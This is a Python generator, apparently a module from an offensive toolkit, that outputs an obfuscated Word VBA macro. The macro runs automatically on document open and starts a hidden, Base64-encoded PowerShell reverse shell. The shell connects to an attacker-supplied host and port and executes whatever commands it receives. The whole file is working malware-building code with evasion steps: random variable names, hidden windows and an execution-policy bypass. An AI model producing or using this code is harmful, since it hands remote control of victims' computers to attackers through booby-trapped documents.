import base64
import random

metadata = {
    "name": "ReverseShell_Obfuscated",
    "description": "Obfuscated VBA macro that launches a Base64-encoded PowerShell reverse shell.",
    "parameters": ["lhost", "lport"]
}

def random_var(length=6):
    import string
    return ''.join(random.choices(string.ascii_letters, k=length))

def split_vba_string(s, max_len=150):
    lines = [s[i:i+max_len] for i in range(0, len(s), max_len)]
    return '" & _\n          "'.join(lines)

def generate_macro_code(params):
    ip = params["lhost"]
    port = params["lport"]

    # Raw PowerShell reverse shell code
    ps_code = (
        "$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
        "$s=$c.GetStream();"
        "[byte[]]$b=0..65535|%{{0}};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
        "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        "$r=(iex $d 2>&1 | Out-String );"
        "$r2=$r+'PS '+(Get-Location).Path+'>'; "
        "$sb=[Text.Encoding]::ASCII.GetBytes($r2);"
        "$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()"
    ).format(ip=ip, port=port)

    b64 = base64.b64encode(ps_code.encode("utf-16le")).decode()
    payload = split_vba_string(b64)

    shell_var = random_var()
    macro_name = random_var()

    return f'''
Sub AutoOpen()
    {macro_name}
End Sub

Sub Document_Open()
    {macro_name}
End Sub

Sub {macro_name}()
    Dim {shell_var} As String
    {shell_var} = "powershell -nop -w hidden -noni -ep bypass -enc " & _
          "{payload}"
    Shell {shell_var}, vbHide
End Sub
'''

